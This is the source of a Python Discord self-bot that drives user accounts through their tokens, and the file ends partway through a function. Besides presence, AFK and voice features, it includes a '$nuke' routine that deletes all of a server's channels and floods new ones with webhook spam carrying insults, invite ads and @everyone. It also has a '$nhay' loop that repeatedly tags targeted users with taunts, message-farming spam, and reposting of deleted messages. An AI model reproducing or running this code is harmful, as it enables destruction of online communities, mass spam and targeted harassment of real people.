import os
import requests
import time
import random
import signal
import sys
import threading
import json
import string
import re
from datetime import datetime
import pytz

try:
    import websocket
except ImportError:
    websocket = None


# ─── TIME ────────────────────────────────────────────────────────────────────

def get_vn_time():
    tz = pytz.timezone("Asia/Ho_Chi_Minh")
    return datetime.now(tz)


def replace_placeholders(text):
    if not text:
        return text
    now = get_vn_time()
    text = text.replace("{date}", now.strftime("%d/%m/20%y"))
    text = text.replace("{time}", now.strftime("%H:%M:%S"))
    return text


def resolve_start_time(mode):
    now_s = int(time.time())
    mode = (mode or "now").strip().lower()

    if mode == "elapsed":
        return now_s - 60
    if mode == "now":
        return now_s
    if mode == "today":
        tz = pytz.timezone("Asia/Ho_Chi_Minh")
        d = datetime.now(tz).replace(hour=0, minute=0, second=0, microsecond=0)
        return int(d.timestamp())
    if mode == "1y":
        return now_s - 365 * 24 * 3600
    if mode == "3y":
        return now_s - 3 * 365 * 24 * 3600
    if mode == "30d":
        return now_s - 30 * 24 * 3600
    if mode == "180d":
        return now_s - 180 * 24 * 3600
    try:
        val = int(mode)
        if val > 1_000_000_000_000:
            val = val // 1000
        return val
    except ValueError:
        return now_s


# ─── CONFIG ──────────────────────────────────────────────────────────────────

def load_config():
    config = {}
    with open("config.txt", "r", encoding="utf-8") as f:
        for line in f:
            line = line.split("#")[0].strip()
            if "=" in line:
                key, value = line.split("=", 1)
                config[key.strip()] = value.strip()
    return config


def parse_voice_pairs(guild_str, channel_str):
    import re as _re
    def extract(s):
        s = s.strip()
        ids = _re.findall(r"\(([^)]+)\)", s)
        if ids:
            return [i.strip() for i in ids if i.strip()]
        return [i.strip() for i in s.split(",") if i.strip()]

    guilds   = extract(guild_str   or "")
    channels = extract(channel_str or "")
    return [{"guild_id": g, "channel_id": c} for g, c in zip(guilds, channels)]


def get_per_token(config, key, index):
    if index == 1:
        return config.get(key, "")
    indexed = config.get(f"{key}_{index}", "")
    if indexed:
        return indexed
    return config.get(key, "")


def load_tokens(config):
    tokens = []
    token = config.get("token", "").strip()
    if token:
        tokens.append(token)
    i = 2
    while True:
        t = config.get(f"token_{i}", "").strip()
        if not t:
            break
        tokens.append(t)
        i += 1
    return tokens


# ─── DISCORD REST ────────────────────────────────────────────────────────────

def check_token(token):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    r = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
    if r.status_code == 200:
        data = r.json()
        username = data.get("username")
        discriminator = data.get("discriminator")
        user_id = data.get("id")
        if discriminator and discriminator != "0":
            return f"{username}#{discriminator}", user_id
        return username, user_id
    return None, None


def get_current_custom_status(token):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    r = requests.get("https://discord.com/api/v9/users/@me/settings", headers=headers)
    if r.status_code == 200:
        return r.json().get("custom_status", None)
    return None


def change_custom_status(token, text):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    payload = {"custom_status": {"text": text}}
    try:
        r = requests.patch(
            "https://discord.com/api/v9/users/@me/settings",
            headers=headers, json=payload, timeout=10
        )
        if r.status_code == 429:
            retry = r.json().get("retry_after", 1)
            time.sleep(retry)
            requests.patch(
                "https://discord.com/api/v9/users/@me/settings",
                headers=headers, json=payload, timeout=10
            )
    except requests.RequestException:
        pass


def restore_custom_status(token, original):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        requests.patch(
            "https://discord.com/api/v9/users/@me/settings",
            headers=headers, json={"custom_status": original}, timeout=10
        )
    except requests.RequestException:
        pass


def delete_message(token, channel_id, message_id):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        requests.delete(
            f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}",
            headers=headers, timeout=10
        )
    except requests.RequestException:
        pass


def edit_message(token, channel_id, message_id, content):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        requests.patch(
            f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}",
            headers=headers, json={"content": content}, timeout=10
        )
    except requests.RequestException:
        pass


def send_message(token, channel_id, content):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.post(
            f"https://discord.com/api/v9/channels/{channel_id}/messages",
            headers=headers, json={"content": content}, timeout=10
        )
        if r.status_code == 200:
            return r.json().get("id")
    except requests.RequestException:
        pass
    return None


def purge_messages(token, channel_id, user_id, count):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    deleted = 0
    last_id = None
    while deleted < count:
        params = {"limit": 100}
        if last_id:
            params["before"] = last_id
        try:
            r = requests.get(
                f"https://discord.com/api/v9/channels/{channel_id}/messages",
                headers=headers, params=params, timeout=10
            )
            if r.status_code != 200:
                break
            msgs = r.json()
            if not msgs:
                break
            last_id = msgs[-1]["id"]
            for msg in msgs:
                if deleted >= count:
                    break
                if msg["author"]["id"] == user_id:
                    try:
                        requests.delete(
                            f"https://discord.com/api/v9/channels/{channel_id}/messages/{msg['id']}",
                            headers=headers, timeout=10
                        )
                        deleted += 1
                        time.sleep(0.4)
                    except requests.RequestException:
                        pass
        except requests.RequestException:
            break
    return deleted


def get_channel_info(token, channel_id):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.get(
            f"https://discord.com/api/v9/channels/{channel_id}",
            headers=headers, timeout=10
        )
        if r.status_code == 200:
            return r.json()
    except requests.RequestException:
        pass
    return None


def resolve_invite(token, invite_code):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.get(
            f"https://discord.com/api/v9/invites/{invite_code}?with_counts=true",
            headers=headers, timeout=10
        )
        if r.status_code == 200:
            return r.json()
    except requests.RequestException:
        pass
    return None


def get_guild_channels(token, guild_id):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.get(
            f"https://discord.com/api/v9/guilds/{guild_id}/channels",
            headers=headers, timeout=10
        )
        if r.status_code == 200:
            return r.json()
    except requests.RequestException:
        pass
    return None


def get_guild_name(token, guild_id):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.get(
            f"https://discord.com/api/v9/guilds/{guild_id}",
            headers=headers, timeout=10
        )
        if r.status_code == 200:
            return r.json().get("name", "Unknown")
    except requests.RequestException:
        pass
    return "Unknown"


def delete_channel(token, channel_id):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.delete(
            f"https://discord.com/api/v9/channels/{channel_id}",
            headers=headers, timeout=10
        )
        return r.status_code in (200, 204)
    except requests.RequestException:
        return False


def create_channel(token, guild_id, name):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.post(
            f"https://discord.com/api/v9/guilds/{guild_id}/channels",
            headers=headers, json={"name": name, "type": 0}, timeout=10
        )
        if r.status_code in (200, 201):
            return r.json()
    except requests.RequestException:
        pass
    return None


def create_webhook(token, channel_id, name):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.post(
            f"https://discord.com/api/v9/channels/{channel_id}/webhooks",
            headers=headers, json={"name": name}, timeout=10
        )
        if r.status_code in (200, 201):
            data = r.json()
            return f"https://discord.com/api/webhooks/{data['id']}/{data['token']}"
    except requests.RequestException:
        pass
    return None


def spam_webhook(url, content):
    while True:
        try:
            r = requests.post(url, json={"content": content}, timeout=10)
            if r.status_code == 404:
                break
            if r.status_code == 429:
                retry = r.json().get("retry_after", 0.1)
                time.sleep(retry)
        except requests.RequestException:
            break


# ─── NUKE ────────────────────────────────────────────────────────────────────

def nuke_server(token, guild_id, ad_invite, rpc_name):
    print("[*] Nuking server...")
    spam_content = (
        f"# your trash server got fucked by {rpc_name}\U0001f62d\U0001f602cry and report it to your mom\n"
        f"# {rpc_name} | little rat cry now \U0001f602\n"
        f"{ad_invite}\n{ad_invite}\n{ad_invite}\n{ad_invite}\n@everyone"
    )
    channel_names = [
        "".join(random.choices(string.ascii_lowercase + string.digits, k=20))
        for _ in range(6)
    ]
    create_index = [0]
    lock = threading.Lock()
    spam_threads = []

    def delete_all_channels():
        channels = get_guild_channels(token, guild_id)
        if channels:
            for ch in channels:
                delete_channel(token, ch["id"])
        print("[+] Deleted all channels")

    def create_and_spam():
        while True:
            with lock:
                if create_index[0] >= len(channel_names):
                    break
                idx = create_index[0]
                create_index[0] += 1
            name = channel_names[idx]
            ch = create_channel(token, guild_id, name)
            if ch:
                print(f"[+] Created #{name}")
                wh = create_webhook(token, ch["id"], "alex_raid")
                if wh:
                    print(f"[+] Webhook in #{name}")
                    t = threading.Thread(target=spam_webhook, args=(wh, spam_content), daemon=True)
                    t.start()
                    spam_threads.append(t)

    dt = threading.Thread(target=delete_all_channels, daemon=True)
    dt.start()
    workers = [threading.Thread(target=create_and_spam, daemon=True) for _ in range(3)]
    for w in workers:
        w.start()
    dt.join()
    for w in workers:
        w.join()
    for t in spam_threads:
        t.join()
    print("[+] Nuke completed")


# ─── ASSETS ──────────────────────────────────────────────────────────────────

SMALL_IMAGE_URL = "https://media.tenor.com/oJwNPShUJnwAAAAj/discord-verification-verification.gif"


def register_asset(token, app_id, url):
    try:
        headers = {"Authorization": token, "Content-Type": "application/json"}
        r = requests.post(
            f"https://discord.com/api/v9/applications/{app_id}/external-assets",
            headers=headers, json={"urls": [url]}, timeout=15
        )
        if r.status_code == 200:
            data = r.json()
            if data:
                path = data[0].get("external_asset_path", "")
                if path:
                    return f"mp:{path}"
    except Exception:
        pass
    return url


def preload_assets(token, app_id, image_url):
    cache = {}
    loaded = 0
    resolved_large = register_asset(token, app_id, image_url)
    cache["large"] = resolved_large
    if resolved_large.startswith("mp:"):
        loaded += 1
    resolved_small = register_asset(token, app_id, SMALL_IMAGE_URL)
    cache["small"] = resolved_small
    if resolved_small.startswith("mp:"):
        loaded += 1
    print(f"[*] Loaded {loaded} image")
    return cache


# ─── STREAM CONFIG ───────────────────────────────────────────────────────────

def load_stream_config():
    config = {}
    try:
        with open("stream.txt", "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and "=" in line:
                    key, value = line.split("=", 1)
                    config[key.strip()] = value.strip()
    except FileNotFoundError:
        return None
    return config


def load_custom_statuses():
    try:
        with open("customstatus.txt", "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []


def load_nhay():
    try:
        with open("nhay.txt", "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []


# ─── ACTIVITY BUILDER ────────────────────────────────────────────────────────

def build_activity_from_slot(sc, slot, app_id, asset_cache, start_time, rpc_type=2, rpc_name="Nova", token_index=1):
    ti = "" if token_index == 1 else f"_{token_index}"
    sl = "_b" if slot == 2 else ""

    def get(key):
        for k in [f"{key}{ti}{sl}", f"{key}{ti}", f"{key}{sl}", key]:
            v = sc.get(k, "")
            if v:
                return v
        return ""

    line1      = replace_placeholders(get("line1"))
    line2      = replace_placeholders(get("line2"))
    line3      = replace_placeholders(get("line3"))
    btn1_label = replace_placeholders(get("button1_label"))
    btn1_url   = get("button1_url")
    btn2_label = replace_placeholders(get("button2_label"))
    btn2_url   = get("button2_url")

    start_ms = (start_time or int(time.time())) * 1000

    print(f"[DEBUG] build_activity start_ms={start_ms} rpc_name={rpc_name}")

    activity = {
        "type": rpc_type,
        "name": rpc_name,
        "timestamps": {"start": start_ms},
    }

    if rpc_type == 2:
        activity["url"] = "https://www.twitch.tv/lucas_the_vampire"

    if line1:
        activity["details"] = line1
    if line2:
        activity["state"] = line2

    asset_text = line3 if line3 else "​"
    activity["assets"] = {
        "large_image": asset_cache.get("large", ""),
        "large_text": asset_text,
        "small_image": asset_cache.get("small", ""),
        "small_text": asset_text,
    }

    buttons = []
    button_urls = []
    if btn1_label and btn1_url:
        buttons.append(btn1_label)
        button_urls.append(btn1_url)
    if btn2_label and btn2_url:
        buttons.append(btn2_label)
        button_urls.append(btn2_url)
    if buttons:
        activity["buttons"] = buttons
        activity["metadata"] = {"button_urls": button_urls}

    if app_id:
        activity["application_id"] = app_id

    return activity


# ─── FARM / NHAY ─────────────────────────────────────────────────────────────

RANDOM_EMOJIS = [
    "\U0001f602", "\U0001f525", "\U0001f480", "\U0001f62d",
    "\U0001f427", "\U0001f338", "\U0001f4af", "\U0001f389",
    "\U0001f60e", "\U0001f921", "\U0001f47e", "\U0001fae1",
    "\U0001f976", "\U0001f923", "\U0001f608", "\U0001f440",
    "\U0001f441", "\U0001f636",
]


def random_farm_message(rpc_name):
    emojis = "".join(random.choices(RANDOM_EMOJIS, k=3))
    return f"{rpc_name} On Top {emojis}"


def farm_loop(token, channel_id, stop_event, rpc_name):
    while not stop_event.is_set():
        for _ in range(4):
            if stop_event.is_set():
                return
            send_message(token, channel_id, random_farm_message(rpc_name))
            time.sleep(0.5)
        stop_event.wait(5)


def nhay_loop(token, channel_id, target_user_ids, nhay_lines, stop_event):
    while not stop_event.is_set():
        if stop_event.is_set():
            return
        random_line = random.choice(nhay_lines)
        mentions = " ".join([f"<@{uid}>" for uid in target_user_ids])
        send_message(token, channel_id, f"{random_line} {mentions}")
        stop_event.wait(random.uniform(1, 2))


# ─── AFK SUMMARY BUILDER ─────────────────────────────────────────────────────

def _format_duration(seconds):
    seconds = int(seconds)
    m, s = divmod(seconds, 60)
    if m and s:
        return f"{m} phút và {s} giây"
    if m:
        return f"{m} phút"
    return f"{s} giây"


def build_afk_summary(display_name, duration, pings):
    """
    Text thuần — không bọc code block.
    Luôn hiện khung, kể cả 0 ping.
    """
    dur_text = _format_duration(duration)

    lines = [
        f":stopwatch: Chào mừng bạn trở lại, **{display_name}**! "
        f"Bạn đã AFK trong {dur_text} và nhận được **{len(pings)}** ping.",
    ]

    if pings:
        lines.append("")
        lines.append("**Các ping đã nhận**")
        for p in pings:
            lines.append(f"**{p['author']}**")
            lines.append(p["jump_url"])
            lines.append("")
        lines.pop()  # bỏ dòng trống cuối

    return "\n".join(lines)


# ─── GATEWAY ─────────────────────────────────────────────────────────────────

class DiscordGateway:
    def __init__(self, token, user_id, account_name, activity=None,
                 stream_config=None, app_id=None, auto_change_stream=False,
                 asset_cache=None, start_time=None,
                 auto_join_voice=False, guild_id=None, voice_channel_id=None,
                 fakelive=False, rpc_type=2, rpc_name="Nova", token_index=1,
                 commands_enabled=True):
        self.token            = token
        self.user_id          = user_id
        self.account_name     = account_name
        self.activity         = activity
        self.stream_config    = stream_config
        self.app_id           = app_id
        self.auto_change_stream = auto_change_stream
        self.asset_cache      = asset_cache or {}
        self.start_time       = start_time if start_time else int(time.time())
        self.ws               = None
        self.heartbeat_interval = None
        self.sequence         = None
        self.running          = True
        self.current_voice    = None
        self.pending_live     = {}
        self.session_id       = None
        self.rejoining_guilds = set()
        self.rpc_type         = rpc_type
        self.rpc_name         = rpc_name
        self.token_index      = token_index
        self.commands_enabled = commands_enabled
        # Farm
        self.farm_stop_event  = None
        self.farm_thread      = None
        self.farm_channel     = None
        # Stream rotate
        self.stream_slot      = 1
        self.stream_lock      = threading.Lock()
        # Voice
        self.auto_join_voice  = auto_join_voice
        self.voice_channels   = []
        self.current_voice_list = []
        self.is_rejoining     = False
        if guild_id and voice_channel_id:
            self.voice_channels = parse_voice_pairs(guild_id, voice_channel_id)
        # Fake live
        self.fakelive = fakelive
        # Nhay
        self.nhay_lines      = load_nhay()
        self.nhay_stop_event = None
        self.nhay_thread     = None
        self.nhay_channel    = None
        self.nhay_targets    = []
        # Snipe
        self.msg_cache       = {}
        self.snipe_cache     = {}
        # AFK
        self.afk_enabled     = False
        self.afk_message     = ""
        self.afk_start_time  = None
        self.afk_no_cancel   = False
        self.afk_pings       = []
        self.afk_auto_reply  = True

    def start(self):
        threading.Thread(target=self._run, daemon=True).start()
        if self.auto_change_stream and self.stream_config:
            threading.Thread(target=self._stream_rotate_loop, daemon=True).start()

    def _stream_rotate_loop(self):
        while self.running:
            time.sleep(5)
            if not self.running:
                break
            with self.stream_lock:
                self.stream_slot = 2 if self.stream_slot == 1 else 1
                self.activity = build_activity_from_slot(
                    self.stream_config, self.stream_slot, self.app_id,
                    self.asset_cache, self.start_time,
                    self.rpc_type, self.rpc_name, token_index=self.token_index
                )
            self._update_presence()

    def _update_presence(self):
        try:
            if self.ws and self.running:
                self.ws.send(json.dumps({
                    "op": 3,
                    "d": {
                        "activities": [self.activity] if self.activity else [],
                        "status": "online",
                        "since": 0,
                        "afk": False,
                    }
                }))
        except Exception:
            pass

    def _run(self):
        while self.running:
            try:
                self.ws = websocket.WebSocket()
                self.ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
                hello = json.loads(self.ws.recv())
                self.heartbeat_interval = hello["d"]["heartbeat_interval"] / 1000
                threading.Thread(target=self._heartbeat, daemon=True).start()
                self._identify()
                while self.running:
                    msg = self.ws.recv()
                    if msg:
                        data = json.loads(msg)
                        if data.get("s"):
                            self.sequence = data["s"]
                        self._handle_event(data)
            except Exception:
                if self.running:
                    time.sleep(5)

    def _heartbeat(self):
        while self.running:
            try:
                time.sleep(self.heartbeat_interval)
                if self.ws and self.running:
                    self.ws.send(json.dumps({"op": 1, "d": self.sequence}))
            except Exception:
                break

    def _identify(self):
        self.ws.send(json.dumps({
            "op": 2,
            "d": {
                "token": self.token,
                "properties": {"os": "windows", "browser": "Discord Client", "device": ""},
                "presence": {
                    "activities": [self.activity] if self.activity else [],
                    "status": "online",
                    "since": 0,
                    "afk": False,
                },
            }
        }))

    def _auto_join_voice(self):
        if not self.auto_join_voice:
            return

        def _join_all_sequential():
            for v in self.voice_channels:
                if not self.running:
                    return
                guild_id   = v["guild_id"]
                channel_id = v["channel_id"]
                try:
                    time.sleep(2)
                    if not self.ws or not self.running:
                        return
                    self.ws.send(json.dumps({
                        "op": 4,
                        "d": {
                            "guild_id": guild_id,
                            "channel_id": channel_id,
                            "self_mute": True,
                            "self_deaf": True,
                        }
                    }))
                    if v not in self.current_voice_list:
                        self.current_voice_list.append(v)
                    print(f"[+] [{self.account_name}] Auto joined voice: {channel_id} ({guild_id})")
                    if self.fakelive:
                        time.sleep(3)
                        self.start_fake_live(guild_id, channel_id)
                        time.sleep(3)
                except Exception as e:
                    print(f"[!] [{self.account_name}] Auto join failed {channel_id}: {e}")

        threading.Thread(target=_join_all_sequential, daemon=True).start()

    def join_voice(self, guild_id, channel_id):
        try:
            self.pending_live[guild_id] = {"guild_id": guild_id, "channel_id": channel_id}
            self.ws.send(json.dumps({
                "op": 4,
                "d": {
                    "guild_id": guild_id,
                    "channel_id": channel_id,
                    "self_mute": True,
                    "self_deaf": True,
                }
            }))
            self.current_voice = {"guild_id": guild_id, "channel_id": channel_id}
            return True
        except Exception:
            self.pending_live.pop(guild_id, None)
            return False

    def _delayed_fake_live(self, guild_id, channel_id):
        time.sleep(1.5)
        self.start_fake_live(guild_id, channel_id)

    def start_fake_live(self, guild_id, channel_id):
        try:
            self.ws.send(json.dumps({
                "op": 18,
                "d": {
                    "type": "guild",
                    "guild_id": guild_id,
                    "channel_id": channel_id,
                    "preferred_region": "singapore"
                }
            }))
            time.sleep(1)
            self.ws.send(json.dumps({
                "op": 4,
                "d": {
                    "guild_id": guild_id,
                    "channel_id": channel_id,
                    "self_mute": True,
                    "self_deaf": True,
                    "self_stream": True,
                    "self_video": False,
                }
            }))
            self.pending_live.pop(guild_id, None)
            print(f"[+] [{self.account_name}] Fake live started in {channel_id}")
        except Exception:
            pass

    def _handle_event(self, data):
        event = data.get("t")
        d = data.get("d")
        if not d:
            return

        if event == "READY":
            self.session_id = d.get("session_id")
            if self.auto_join_voice:
                threading.Thread(target=self._auto_join_voice, daemon=True).start()

        if event == "VOICE_STATE_UPDATE":
            if d.get("user_id") == self.user_id:
                event_guild   = d.get("guild_id", "")
                event_channel = d.get("channel_id")

                if event_channel and event_guild in self.pending_live:
                    self.pending_live.pop(event_guild, None)

                is_stream_event = d.get("self_stream", False)
                if not event_channel and event_guild and not is_stream_event:
                    if event_guild in self.rejoining_guilds:
                        pass
                    else:
                        target = None
                        for v in self.voice_channels:
                            if v["guild_id"] == event_guild:
                                target = v
                                break
                        if not target and self.current_voice and self.current_voice.get("guild_id") == event_guild:
                            target = self.current_voice
                            self.current_voice = None
                        if target:
                            self.current_voice_list = [
                                v for v in self.current_voice_list
                                if v["guild_id"] != event_guild
                            ]
                            self.pending_live.pop(event_guild, None)
                            print(f"[*] [{self.account_name}] Left voice: {target['channel_id']} ({event_guild})")
                            if self.auto_join_voice:
                                self.rejoining_guilds.add(event_guild)
                                def _do_rejoin(v, gid):
                                    time.sleep(2)
                                    try:
                                        if self.ws and self.running:
                                            self.ws.send(json.dumps({
                                                "op": 4,
                                                "d": {
                                                    "guild_id": v["guild_id"],
                                                    "channel_id": v["channel_id"],
                                                    "self_mute": True,
                                                    "self_deaf": True,
                                                }
                                            }))
                                            if v not in self.current_voice_list:
                                                self.current_voice_list.append(v)
                                            print(f"[+] [{self.account_name}] Rejoined voice: {v['channel_id']} ({v['guild_id']})")
                                            if self.fakelive:
                                                self.pending_live[v["guild_id"]] = v
                                                time.sleep(3)
                                                self.start_fake_live(v["guild_id"], v["channel_id"])
                                    except Exception:
                                        pass
                                    finally:
                                        self.rejoining_guilds.discard(gid)
                                threading.Thread(target=_do_rejoin, args=(target, event_guild), daemon=True).start()

        if event == "MESSAGE_DELETE":
            ch  = d.get("channel_id")
            mid = d.get("id")
            cached = self.msg_cache.get(ch, {}).pop(mid, None)
            if cached:
                if ch not in self.snipe_cache:
                    self.snipe_cache[ch] = []
                self.snipe_cache[ch].insert(0, cached)
                self.snipe_cache[ch] = self.snipe_cache[ch][:20]

        if event == "MESSAGE_CREATE":
            author = d.get("author", {})
            msg_channel = d.get("channel_id")
            msg_content = d.get("content", "")
            msg_author  = d.get("author", {})
            msg_id      = d.get("id", "")

            if msg_content and msg_id:
                if msg_channel not in self.msg_cache:
                    self.msg_cache[msg_channel] = {}
                ch_cache = self.msg_cache[msg_channel]
                if len(ch_cache) > 500:
                    ch_cache.pop(next(iter(ch_cache)), None)
                ch_cache[msg_id] = {
                    "content"  : msg_content,
                    "author"   : msg_author.get("username", "Unknown"),
                    "timestamp": d.get("timestamp", ""),
                }

            # ─── AFK: track ping + auto-reply ─────────────────────────────
            if self.afk_enabled:
                sender_id = msg_author.get("id")
                is_self   = sender_id == self.user_id
                is_mention = any(m.get("id") == self.user_id for m in d.get("mentions", []))
                is_dm      = d.get("guild_id") is None

                ref = d.get("referenced_message") or {}
                ref_author_id = (ref.get("author") or {}).get("id")
                is_reply_to_me = ref_author_id == self.user_id

                if not is_self and (is_mention or is_dm or is_reply_to_me):
                    gid = d.get("guild_id") or "@me"
                    jump_url = f"https://discord.com/channels/{gid}/{msg_channel}/{msg_id}"

                    display_name = (
                        msg_author.get("global_name")
                        or msg_author.get("display_name")
                        or msg_author.get("username")
                        or "Unknown"
                    )

                    self.afk_pings.append({
                        "author"    : display_name,
                        "jump_url"  : jump_url,
                        "channel_id": msg_channel,
                        "message_id": msg_id,
                    })
                    print(f"[AFK] {display_name} ping {self.account_name} -> {jump_url}")

                    if self.afk_auto_reply:
                        reason_part = f": **{self.afk_message}**" if self.afk_message else ""
                        reply_text  = (
                            f"Hiện tại {self.account_name} đang AFK "
                            f"(<t:{self.afk_start_time}:R>){reason_part}"
                        )
                        self.afk_no_cancel = True
                        send_message(self.token, msg_channel, reply_text)
                        def _reset_nc(self=self):
                            time.sleep(1)
                            self.afk_no_cancel = False
                        threading.Thread(target=_reset_nc, daemon=True).start()

            if author.get("id") != self.user_id:
                return

            content    = d.get("content", "").strip()
            channel_id = d.get("channel_id")
            message_id = d.get("id")
            guild_id   = d.get("guild_id")

            # ─── Tự gửi tin nhắn → tắt AFK + gửi summary ─────────────────
            if self.afk_enabled and not self.afk_no_cancel:
                pings_copy = list(self.afk_pings)
                duration   = int(time.time() - (self.afk_start_time or time.time()))
                display    = self.account_name

                self.afk_enabled    = False
                self.afk_start_time = None
                self.afk_message    = ""
                self.afk_pings      = []

                summary = build_afk_summary(display, duration, pings_copy)
                send_message(self.token, channel_id, summary)

            if not self.commands_enabled:
                return

            if content == "$menu":
                edit_message(self.token, channel_id, message_id, (
                    f"## Super Self Bot - {self.rpc_name}\n\n"
                    f"**\U0001f6e0\ufe0f Commands** :\n"
                    f"`$voice [channel id]` : Join Voice Channel and Keep it online\n"
                    f"`$farm` : Spam Message to get exp for OWO or another bot\n"
                    f"`$nuke [invite]` : Nuke the server\n"
                    f"`$nhay @user1 @user2 ...` : Spam tag multi users với random text (toggle)\n"
                    f"`$purge [số]` : Xóa tin nhắn của mình (mặc định 10)\n"
                    f"`$afk [message]` : Bật/tắt AFK — tự track ping và gửi summary khi bạn nhắn lại\n"
                    f"`$snipe` : Xem tin nhắn vừa bị xóa\n\n"
                    f"<@{self.user_id}>"
                ))

            elif content == "$nhay" or content.startswith("$nhay "):
                delete_message(self.token, channel_id, message_id)
                if self.nhay_thread and self.nhay_thread.is_alive():
                    self.nhay_stop_event.set()
                    self.nhay_thread.join()
                    self.nhay_stop_event = None
                    self.nhay_thread = None
                    self.nhay_channel = None
                    self.nhay_targets = []
                    print(f"[+] [{self.account_name}] Stopped Nhay")
                    return
                mentions = re.findall(r"<@!?(\d+)", content)
                if not mentions:
                    print(f"[!] [{self.account_name}] $nhay: No user mentioned")
                    return
                if not self.nhay_lines:
                    print(f"[!] [{self.account_name}] nhay.txt is empty or not found")
                    return
                self.nhay_stop_event = threading.Event()
                self.nhay_channel    = channel_id
                self.nhay_targets    = mentions
                self.nhay_thread = threading.Thread(
                    target=nhay_loop,
                    args=(self.token, channel_id, mentions, self.nhay_lines, self.nhay_stop_event),
                    daemon=True
                )
                self.nhay_thread.start()
                targets_str = " ".join([f"<@{uid}>" for uid in mentions])
                print(f"[+] [{self.account_name}] Started Nhay -> {targets_str}")

            elif content == "$farm":
                delete_message(self.token, channel_id, message_id)
                if self.farm_thread and self.farm_thread.is_alive():
                    self.farm_stop_event.set()
                    self.farm_thread.join()
                    self.farm_stop_event = None
                    self.farm_thread = None
                    self.farm_channel = None
                    print(f"[+] [{self.account_name}] Stopped Farm")
                else:
                    self.farm_stop_event = threading.Event()
                    self.farm_channel    = channel_id
                    self.farm_thread = threading.Thread(
                        target=farm_loop,
                        args=(self.token, channel_id, self.farm_stop_event, self.rpc_name),
                        daemon=True
                    )
                    self.farm_thread.start()
                    print(f"[+] [{self.account_name}] Started Farm")

            elif content.startswith("$nuke "):
                delete_message(self.token, channel_id, message_id)
                if not guild_id:
                    print("Cannot nuke in DM")
                    return
                parts = content.split(" ", 1)
                if len(parts) < 2 or not parts[1].strip():
                    print("Cannot find invite")
                    return
                invite_input = parts[1].strip()
                invite_code  = (invite_input
                                .replace("https://discord.gg/", "")
                                .replace("https://discord.com/invite/", "")
                                .replace("discord.gg/", ""))
                if not resolve_invite(self.token, invite_code):
                    print(f"Cannot find invite {invite_input}")
                    return
                channels = get_guild_channels(self.token, guild_id)
                if channels is None:
                    print("Cannot access this server (missing permissions)")
                    return
                guild_name = get_guild_name(self.token, guild_id)
                print(f"[+] Nuking {guild_name} ({guild_id})")
                threading.Thread(
                    target=nuke_server,
                    args=(self.token, guild_id, f"https://discord.gg/{invite_code}", self.rpc_name),
                    daemon=True
                ).start()

            elif content.startswith("$voice "):
                delete_message(self.token, channel_id, message_id)
                parts = content.split(" ", 1)
                if len(parts) < 2 or not parts[1].strip():
                    return
                voice_channel_id = parts[1].strip()
                if not guild_id:
                    return
                channel_info = get_channel_info(self.token, voice_channel_id)
                if not channel_info:
                    print(f"Cannot find channel {voice_channel_id}")
                    return
                if channel_info.get("type") not in (2, 13):
                    print(f"Not a voice channel: {voice_channel_id}")
                    return
                if channel_info.get("guild_id") != guild_id:
                    print(f"Channel {voice_channel_id} not in this server")
                    return
                if self.join_voice(guild_id, voice_channel_id):
                    print(f"[+] [{self.account_name}] Joined voice: {channel_info.get('name', '?')} ({voice_channel_id})")

            elif content.startswith("$purge"):
                delete_message(self.token, channel_id, message_id)
                parts = content.split(" ", 1)
                try:
                    count = int(parts[1].strip()) if len(parts) > 1 else 10
                    count = max(1, min(count, 200))
                except ValueError:
                    count = 10
                def _do_purge(ch, uid, n):
                    deleted = purge_messages(self.token, ch, uid, n)
                    print(f"[+] [{self.account_name}] Purged {deleted} messages")
                threading.Thread(target=_do_purge, args=(channel_id, self.user_id, count), daemon=True).start()

            elif content.startswith("$afk"):
                parts  = content.split(" ", 1)
                reason = parts[1].strip() if len(parts) > 1 else ""
                self.afk_enabled    = True
                self.afk_message    = reason
                self.afk_start_time = int(time.time())
                self.afk_pings      = []
                preview = f" ({reason})" if reason else ""
                edit_message(self.token, channel_id, message_id,
                             f"**AFK bật{preview}** — nhắn tin lại để xem ping đã nhận.")
                threading.Thread(
                    target=lambda: (time.sleep(3), delete_message(self.token, channel_id, message_id)),
                    daemon=True
                ).start()

            elif content.startswith("$snipe"):
                delete_message(self.token, channel_id, message_id)
                parts_s = content.split()
                try:
                    count = min(int(parts_s[1]), 10) if len(parts_s) > 1 else 1
                except ValueError:
                    count = 1
                deleted_list = self.snipe_cache.get(channel_id, [])[:count]
                if not deleted_list:
                    msg_id_sent = send_message(self.token, channel_id,
                        f"Không có tin nhắn nào bị xóa gần đây.")
                else:
                    lines = []
                    for i, s in enumerate(deleted_list, 1):
                        ts  = s["timestamp"][:19].replace("T", " ") if s["timestamp"] else "?"
                        pre = f"**{i}.** " if count > 1 else ""
                        lines.append(f"{pre}**{s['author']}** lúc `{ts}`:\n{s['content']}")
                    msg_id_sent = send_message(self.token, channel_id, "\n\n".join(lines))
                if msg_id_sent:
                    threading.Thread(
                        target=lambda mid=msg_id_sent: (time.sleep(15), delete_message(self.token, channel_id, mid)),
                        daemon=True
                    ).start()

    def stop(self):
        if self.farm_stop_event:
            self.farm_stop_event.set()
        if self.nhay_stop_event:
